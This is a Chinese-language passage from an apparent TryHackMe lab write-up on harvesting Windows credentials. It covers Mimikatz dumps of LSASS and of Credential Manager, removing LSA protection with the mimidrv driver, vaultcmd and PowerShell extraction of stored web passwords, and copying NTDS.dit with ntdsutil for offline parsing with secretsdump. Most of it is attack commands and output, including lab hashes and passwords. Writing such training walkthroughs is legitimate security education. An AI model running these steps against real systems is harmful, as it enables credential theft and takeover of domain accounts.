<p>完成权限检查之后，我们可以使用以下命令来提取lsass.exe进程的内存中所存储的密码信息(如果目标LSASS进程是受保护状态，以下命令则无法成功执行)：（我这里是执行不成功的，以下是成功示例）</p>
<pre><code class="hljs scss">mimikatz # sekurlsa::logonpasswords

Authentication Id : <span class="hljs-number">0</span> ; <span class="hljs-number">515377</span> (<span class="hljs-number">00000000</span>:<span class="hljs-number">0007</span>dd31)
Session           : RemoteInteractive from <span class="hljs-number">3</span>
User Name         : Administrator
Domain            : THM
Logon Server      : CREDS-HARVESTIN
Logon Time        : <span class="hljs-number">6</span>/<span class="hljs-number">3</span>/<span class="hljs-number">2022</span> <span class="hljs-number">8</span>:<span class="hljs-number">30</span>:<span class="hljs-number">44</span> AM
SID               : S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">1966530601</span>-<span class="hljs-number">3185510712</span>-<span class="hljs-number">10604624</span>-<span class="hljs-number">500</span>
        msv :
         [<span class="hljs-number">00000003</span>] Primary
         * Username : Administrator
         * Domain   : THM
         * NTLM     : <span class="hljs-number">98</span>d3a787a80d08385cea7fb4aa2a4261
         * SHA1     : <span class="hljs-number">64</span>a137cb8178b7700e6cffa387f4240043192e72
         * DPAPI    : bc355c6ce366fdd4fd91b54260f9cf70
...</code></pre>
<p>在上述命令的输出结果中，Mimikatz会为我们列出很多关于目标机器的账户信息，我们可以在上面的输出结果中检查Administrator用户的Primary部分，然后我们就能看到管理员用户所对应的NTLM密码哈希。</p>
<p>注意：如果我们要成功获取到目标用户的密码哈希值，那么目标用户(受害者)必须已经登录过目标系统，并且该用户的凭据也已经被目标机所缓存。</p>
<h2 id="受保护的lsass进程">受保护的LSASS进程</h2>
<p>在2012年，微软引入了LSA保护机制，它能防止LSASS进程被恶意访问，这能尽量避免攻击者从LSASS进程的相关内存中提取凭据。</p>
<p>接下来，我们将学习如何禁用目标机器中的LSA保护并使用Mimikatz从LSASS进程的内存中提取凭据；如果我们想要让LSASS进程处于受保护状态，我们可以将注册表中的RunAsPPL DWORD的值修改为1(相关的注册表路径<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa</code>)。</p>
<p>我们在针对受保护的LSASS进程执行<code>sekurlsa::logonpasswords</code>命令时，会收到如下所示的错误结果：</p>
<pre><code class="hljs scss">#由于LSA保护机制，我们无法成功提取LSASS进程的内存中所存储的密码信息。

mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (<span class="hljs-number">0</span>x00000005)</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304184144156.png" alt="image-20240304184144156"></p>
<p>直接执行上述命令会向我们返回0x00000005错误代码(Access Denied)。幸运的是，Mimikatz针对此类情况为我们提供mimidrv.sys驱动程序，该程序可以在系统内核级别工作以禁用LSA保护。</p>
<pre><code class="hljs scss">#使用 !+ 将mimidrv导入Mimikatz，即将mimidrv驱动程序加载到当前内存中。

mimikatz # !+
<span class="hljs-selector-attr">[*]</span> 'mimidrv' service not present
<span class="hljs-selector-attr">[+]</span> 'mimidrv' service successfully registered
<span class="hljs-selector-attr">[+]</span> 'mimidrv' service ACL to everyone
<span class="hljs-selector-attr">[+]</span> 'mimidrv' service started</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304184533656.png" alt="image-20240304184533656"></p>
<p>注意：如果上述导入操作失败并出现<code>isFileExist</code>错误，那么我们可以先退出当前的mimikatz界面，然后再次加载C:\Tools\Mimikatz\mimikatz.exe并再次运行上述导入命令。（如果依旧错误，那就确定自身当前目录是否与mimikatz.exe在同一目录下）</p>
<p>成功加载好mimidrv驱动程序之后，我们可以通过执行以下Mimikatz命令来禁用当前机器(也就是目标机器)的LSA保护：</p>
<pre><code class="hljs scss">mimikatz # !processprotect /process:lsass.exe /remove
Process : lsass.exe
PID <span class="hljs-number">840</span> -&gt; <span class="hljs-number">00</span>/<span class="hljs-number">00</span> [<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span>]</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304184653686.png" alt="image-20240304184653686"></p>
<p>然后，我们就可以继续执行<code>sekurlsa::logonpasswords</code>命令来提取lsass.exe进程的内存中所存储的密码信息。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304184836865.png" alt="image-20240304184836865"></p>
<h1 id="0x06-windows凭据管理器">0x06 Windows凭据管理器</h1>
<p>在本小节中，我们将了解Windows凭据管理器，并尝试利用它来转储系统凭据。</p>
<h2 id="什么是凭据管理器">什么是凭据管理器？</h2>
<p>凭据管理器是Windows的一个功能，它可用于存储网站、应用程序和域网络的登录敏感信息(如登录凭据、用户名、密码和internet地址等)。与Windows凭据管理器相关的凭据类别有四种：</p>
<ul>
<li>Web凭据：包含存储在互联网浏览器中或者其他应用程序中的身份验证详细信息。</li>
<li>Windows凭据：包含Windows身份验证的详细信息，例如NTLM身份验证或者Kerberos身份验证。</li>
<li>通用凭据：包含基本身份验证的详细信息，例如明文用户名和密码。</li>
<li>基于证书的凭据：包含基于证书的身份验证详细信息。</li>
</ul>
<p>注意：身份验证详细信息会存储在目标用户的文件夹中，而不会在Windows用户帐户之间共享，但是，这些身份验证信息还会被缓存在计算机内存中。</p>
<h2 id="访问凭据管理器">访问凭据管理器</h2>
<p>我们可以通过GUI界面(控制面板-&gt;用户帐户-&gt;凭据管理器)或者命令提示符界面来访问Windows凭据管理器，本小节将重点介绍使用命令提示符的场景。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304185247113.png" alt="image-20240304185247113"></p>
<p>在cmd界面中，我们将使用<code>vaultcmd</code>实用程序来查看Microsoft凭据管理器，如下所示，我们可以先使用命令来列出windows目标机中当前可用的凭据库信息：</p>
<pre><code class="hljs scss">#列出凭据管理器中的可用凭据

C:\Users\Administrator&gt; vaultcmd /list
Currently loaded vaults:
        Vault: Web Credentials
        Vault Guid:<span class="hljs-number">4</span>BF4C442-<span class="hljs-number">9</span>B8A-<span class="hljs-number">41</span>A0-B380-DD4A704DDB28
        Location: C:\Users\Administrator\AppData\Local\Microsoft\Vault\<span class="hljs-number">4</span>BF4C442-<span class="hljs-number">9</span>B8A-<span class="hljs-number">41</span>A0-B380-DD4A704DDB28

        Vault: Windows Credentials
        Vault Guid:<span class="hljs-number">77</span>BC582B-F0A6-<span class="hljs-number">4</span>E15-<span class="hljs-number">4</span>E80-<span class="hljs-number">61736</span>B6F3B29
        Location: C:\Users\Administrator\AppData\Local\Microsoft\Vault</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304185339528.png" alt></p>
<p>tips：如上面的输出结果所示，在默认情况下，Windows有两个凭据库，一个用于保存Web凭据，另一个用于保存Windows机器凭据。</p>
<p>接下来，让我们通过运行带有<code>/listproperties</code>的vaultcmd命令来检查Web凭据库中是否已经存储了凭据信息：</p>
<pre><code class="hljs scss">#检查“Web凭据库”中是否存储了凭据：存储了凭据或者没有存储凭据。

C:\Users\Administrator&gt; VaultCmd /listproperties:<span class="hljs-string">"Web Credentials"</span>
Vault Properties: Web Credentials
Location: C:\Users\Administrator\AppData\Local\Microsoft\Vault\<span class="hljs-number">4</span>BF4C442-<span class="hljs-number">9</span>B8A-<span class="hljs-number">41</span>A0-B380-DD4A704DDB28
Number of credentials: <span class="hljs-number">1</span>
Current protection method: DPAPI</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304185510843.png" alt="image-20240304185510843"></p>
<p>成功确认Web凭据库中存储了凭据之后，我们可以继续列出上述Web凭据库中所存储凭据的详细信息：</p>
<pre><code class="hljs scss">#列出“Web凭据库”中的凭据详细信息

C:\Users\Administrator&gt; VaultCmd /listcreds:<span class="hljs-string">"Web Credentials"</span>
Credentials in vault: Web Credentials

Credential schema: Windows Web Password Credential
Resource: internal-app.thm.red
Identity: THMUser Saved By: MSEdge
Hidden: No
Roaming: Yes</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304185557853.png" alt="image-20240304185557853"></p>
<h2 id="使用powershell脚本转储凭据">使用PowerShell脚本转储凭据</h2>
<p>我们可以使用PowerShell脚本如<a target="_blank" rel="noopener" href="https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1">Get-WebCredentials.ps1</a>来尝试转储Windows凭据管理器中的凭据，为了方便起见，PS脚本已经放置在目标机器上的C:\Tools\目录中。</p>
<p>我们先确保使用绕过策略来执行PowerShell，然后再将Get-WebCredentials.ps1作为模块导入，具体命令如下所示：</p>
<pre><code class="hljs scss">#使用脚本获取web凭据相关的明文信息

C:\Users\Administrator&gt; powershell -ex bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator&gt; Import-Module C:\Tools\Get-WebCredentials.ps1
PS C:\Users\Administrator&gt; Get-WebCredentials

UserName  Resource             Password     Properties
--------  --------             --------     ----------
THMUser internal-app.thm.red Password! {<span class="hljs-selector-attr">[hidden, False]</span>, <span class="hljs-selector-attr">[applicationid, 00000000-0000-0000-0000-000000000000]</span>, <span class="hljs-selector-attr">[application, MSEdge]</span>}</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304190455212.png" alt="image-20240304190455212"></p>
<p>根据上面的输出结果显示，我们获得了用于访问内部应用程序的用户名和密码信息。</p>
<blockquote>
<p>用户名：THMuser</p>
<p>密码：E4syPassw0rd</p>
</blockquote>
<h2 id="使用runas转储并利用凭据">使用runas转储并利用凭据</h2>
<p>利用已存储凭据的另一种方法是使用RunAs。RunAs是一个命令行内置工具，它允许攻击者在不同用户权限下运行Windows应用程序或工具。RunAs工具有各种可以在Windows系统中使用的命令参数。<code>/savecred</code>参数允许我们在Windows凭据管理器(在Windows凭据库部分下)中保存用户的凭据。因此，当我们下次以同一用户身份执行runas命令时将不会被要求输入密码进行验证。</p>
<p>我们还可以使用<code>cmdkey</code>来枚举目标机器中所存储的凭据，它是一种用于创建、删除和显示计算机已存储的Windows凭据的工具，我们可以使用<code>/list</code>命令参数来显示当前机器所有已经存储的Windows凭据，或者使用<code>/list:computername</code>命令参数来显示指定的凭据信息：</p>
<pre><code class="hljs scss">#枚举当前机器已经存储的Windows凭据

C:\Users\thm&gt; cmdkey /list

Currently stored credentials:

    Target: LegacyGeneric:target=<span class="hljs-number">10.10</span>.<span class="hljs-number">237.226</span>
    Type: Generic
    User: thm

    Target: Domain:interactive=thm.red\thm-local
    Type: Domain Password
    User: thm.red\thm-local</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304190631270.png" alt="image-20240304190631270"></p>
<p>上面的输出结果显示我们有一个已经存储的<code>thm.red\thm-local</code>用户的域帐户密码。注意，目标机器中已经存储的凭据也可以用于访问其他域内服务器。现在让我们使用runas命令作为<code>thm-local</code>本地用户来执行Windows应用程序。</p>
<pre><code class="hljs scss">#使用/savecred命令参数以本地用户身份运行cmd<span class="hljs-selector-class">.exe</span>应用程序

C:\Users\thm&gt; runas /savecred /user:THM.red\thm-local cmd.exe
Attempting to start cmd.exe as user <span class="hljs-string">"THM.red\thm-local"</span> ...</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304190830140.png" alt="image-20240304190830140"></p>
<p>这将为我们弹出一个新的cmd.exe命令提示符界面，我们可以在这个命令提示符界面中运行whoami 命令来确认我们当前的用户身份，然后根据以下路径找到flag并回答本小节的任务问题。</p>
<blockquote>
<p>C:\Users\thm-local\Saved Games\flag.txt</p>
</blockquote>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304190956102.png" alt="image-20240304190956102"></p>
<h2 id="使用mimikatz转储凭据">使用Mimikatz转储凭据</h2>
<p>我们还可以使用Mimikatz工具来转储凭据，它可以从当前计算机的内存中转储保存在Windows凭据管理器中的明文密码：</p>
<pre><code class="hljs scss">#使用Mimikatz工具针对Windows凭据管理器进行内存转储

C:\Users\Administrator&gt; c:\Tools\Mimikatz\mimikatz.exe

  .#####.   mimikatz <span class="hljs-number">2.2</span>.<span class="hljs-number">0</span> (x64) #<span class="hljs-number">19041</span> May <span class="hljs-number">19</span> <span class="hljs-number">2020</span> <span class="hljs-number">00</span>:<span class="hljs-number">48</span>:<span class="hljs-number">59</span>
 .## ^ ##.  <span class="hljs-string">"A La Vie, A L'Amour"</span> - (oe.eo)
 ## / \ ##  <span class="hljs-comment">/*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
<span class="hljs-comment"> ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span>
<span class="hljs-comment"> '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span>
<span class="hljs-comment">  '#####'        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/</span>

mimikatz # privilege::debug
Privilege <span class="hljs-string">'20'</span> OK

mimikatz # sekurlsa::credman</code></pre>
<p>本小节中所讨论的技术也可以通过使用其他工具(如Empire、Metasploit等)来完成，请自行扩展。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304191423150.png" alt="image-20240304191423150"></p>
<p>使用Mimikatz针对存储在Windows凭据库中的10.10.237.226 SMB共享进行内存凭据转储，最终我们得到的密码是什么?</p>
<pre><code class="hljs scss">C:\Users\Administrator&gt; c:\Tools\Mimikatz\mimikatz.exe

mimikatz # privilege::debug
Privilege <span class="hljs-string">'20'</span> OK

mimikatz # vault::cred /patch</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304192420407.png" alt="image-20240304192420407"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304192637664.png" alt="image-20240304192637664"></p>
<h1 id="0x07-域控制器中的凭据">0x07 域控制器中的凭据</h1>
<p>本小节将讨论在本地和远程转储域控制器(DC)中的密码哈希所需的操作步骤。</p>
<h2 id="ntds-域控制器">NTDS 域控制器</h2>
<p>新技术目录服务(NTDS-New Technologies Directory Services)是一个包含所有Active Directory数据的数据库，该数据库包括AD对象、属性、凭据等。NTDS. DTS数据库文件中的数据主要由以下三个表组成：</p>
<ul>
<li>架构表(Schema table)：包含对象的类型及其关系。</li>
<li>链接表：包含对象的属性及其属性值。</li>
<li>数据类型：包含用户和组。</li>
</ul>
<p>NTDS数据库在Windows计算机中的默认路径为<code>C:\Windows\NTDS</code>，而且该数据库会经过加密处理以防止攻击者直接从目标计算机中提取数据。在通常情况下，用户不被允许从正在运行的计算机上直接访问NTDS.dit数据库文件，因为该文件将由相关的Active Directory使用并会被锁定。</p>
<p>然而，攻击者仍然有各种方法可以访问目标计算机中的NTDS.dit数据库文件。本小节将讨论如何使用<code>ntdsutil</code>和<code>Diskshadow</code>工具来获得NTDS文件的副本，以及如何转储该文件所包含的内容。需要注意的是，在解密NTDS文件时，我们还需要一个系统引导密钥来尝试解密由LSA所隔离的凭据，该凭据存储在<code>SECURITY</code>文件系统中；因此，我们还必须转储包含所有需要解密的文件的security文件。</p>
<h2 id="ntdsutil介绍">Ntdsutil介绍</h2>
<p>Ntdsutil是一个Windows实用程序，主要用于管理和维护Active Directory配置，它可以在各种场景中使用，例如：</p>
<ul>
<li>恢复活动目录(Active Directory)中已删除的对象。</li>
<li>执行针对AD数据库的维护措施。</li>
<li>活动目录(Active Directory)快照管理。</li>
<li>设置目录服务还原模式(DSRM-Directory Services Restore Mode)的管理员密码。</li>
</ul>
<p>有关Ntdsutil的更多信息，请访问Microsoft的<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc753343(v=ws.11)">相关官方文档页面</a>。</p>
<h2 id="本地转储攻击者无凭据">本地转储(攻击者无凭据)</h2>
<p>如果我们作为攻击者没有可用的凭据，但是拥有对目标域控制器(DC)的管理员访问权限，那么我们通常可以尝试执行本地转储操作。我们将依靠Windows实用程序来转储NTDS文件并离线破解它们。首先，假设在本次实验中我们具有对目标域控制器的管理员访问权限。</p>
<p>要成功转储NTDS文件的内容，我们还需要在目标域控制器中获取以下文件：</p>
<ul>
<li>C:\Windows\NTDS\ntds.dit</li>
<li>C:\Windows\System32\config\SYSTEM</li>
<li>C:\Windows\System32\config\SECURITY</li>
</ul>
<p>下面是一行PowerShell命令，作用是使用Ntdsutil工具将NTDS文件转储到目标机器中的C:\temp目录下。</p>
<pre><code class="hljs scss">#从受害机器(目标DC机器)中转储NTDS文件的内容
#通过RDP或者直接访问Tryhackme所提供的浏览器页面来操作目标机器，以管理员用户身份在目标机上启动cmd<span class="hljs-selector-class">.exe</span>并执行以下命令

C:\Users\thm&gt; powershell <span class="hljs-string">"ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"</span>

#在命令提示符界面下调用ntdsutil.exe工具,导出Active Directory域控制器的NTDS.dit数据库备份文件。
#具体分析如下:
#ntdsutil.exe:ntdsutil.exe是Windows中的一个工具，可用于管理Active Directory数据库。
#<span class="hljs-string">'ac i ntds'</span>:这是ntdsutil.exe工具中的命令，用于连接Active Directory。
#<span class="hljs-string">'ifm'</span>:进入控制台交互界面。
#<span class="hljs-string">'create full c:\temp'</span>:执行备份操作，创建完整的NTDS.dit数据库的副本文件到c:\temp目录下。
#q q:退出ntdsutil.exe工具。</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304193606451.png" alt="image-20240304193606451"></p>
<p>现在，如果我们检查目标机器中的<code>c:\temp</code>目录，我们将会看到两个文件夹：Active Directory和registry，其中包含了我们所需要的三个文件。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="C:/Users/%E4%BB%98%E6%80%9D%E9%92%A7/AppData/Roaming/Typora/typora-user-images/image-20240304193633712.png" alt="image-20240304193633712"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304193701369.png" alt="image-20240304193701369"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304193734379.png" alt="image-20240304193734379"></p>
<p>我们可以将所需的上述三个文件传输到我们的攻击机中，然后再运行secretsdump.py脚本从我们所转储的内存文件中提取密码哈希值。</p>
<pre><code class="hljs scss">#在攻击机上针对目标机使用SCP命令完成文件传输，其中远程目标机在以下命令中的表示格式为THM\\thm<span class="hljs-keyword">@MACHINE</span>_IP或者THM.red\\thm<span class="hljs-keyword">@MACHINE</span>_IP
#在使用SCP命令处理带空格的文件路径时要在空格前额外添加“\\\”。

scp THM\\thm@<span class="hljs-number">10.10</span>.<span class="hljs-number">63.254</span>:<span class="hljs-attribute">C</span>:/temp/registry/SECURITY /tmp/
scp THM\\thm@<span class="hljs-number">10.10</span>.<span class="hljs-number">63.254</span>:<span class="hljs-attribute">C</span>:/temp/registry/SYSTEM /tmp/
scp THM\\thm@<span class="hljs-number">10.10</span>.<span class="hljs-number">63.254</span>:<span class="hljs-attribute">c</span>:/temp/Active\\\ Directory/ntds.dit /tmp/
#Password：Passw0rd!

#在攻击机上从本地NTDS文件中提取哈希值
python3 /impacket/examples/secretsdump.py -sam /tmp/SECURITY -system /tmp/SYSTEM -ntds /tmp/ntds.dit local</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304194432969.png" alt="image-20240304194432969"></p>
<pre><code class="hljs css">python3 ./impacket/examples/secretsdump<span class="hljs-selector-class">.py</span> -sam /tmp/SECURITY -system /tmp/SYSTEM -ntds /tmp/ntds<span class="hljs-selector-class">.dit</span> local
Impacket v0.<span class="hljs-number">12.0</span><span class="hljs-selector-class">.dev1</span>+<span class="hljs-number">20240130.154745</span>.<span class="hljs-number">97007</span>e84 - Copyright <span class="hljs-number">2023</span> Fortra

<span class="hljs-selector-attr">[*]</span> Target system bootKey: <span class="hljs-number">0</span>x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
[-] SAM hashes extraction failed: <span class="hljs-string">'NoneType'</span> object is not subscriptable
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # <span class="hljs-number">0</span> found and decrypted: <span class="hljs-number">55</span>db1e9562985070bbba0ef2cc25754c
[*] Reading and decrypting hashes from /tmp/ntds.dit 
Administrator:<span class="hljs-number">500</span>:aad3b435b51404eeaad3b435b51404ee:fc9b72f354f0371219168bdb1460af32:::
Guest:<span class="hljs-number">501</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::
CREDS-HARVESTIN$:<span class="hljs-number">1008</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">18</span>d4f9b55f0e4cf0aa9d57998433b7f2:::
krbtgt:<span class="hljs-number">502</span>:aad3b435b51404eeaad3b435b51404ee:ec44ddf5ae100b898e9edab74811430d:::
thm.red\thm:<span class="hljs-number">1114</span>:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
thm.red\victim:<span class="hljs-number">1115</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">6</span>c3d8f78c69ff2ebc377e19e96a10207:::
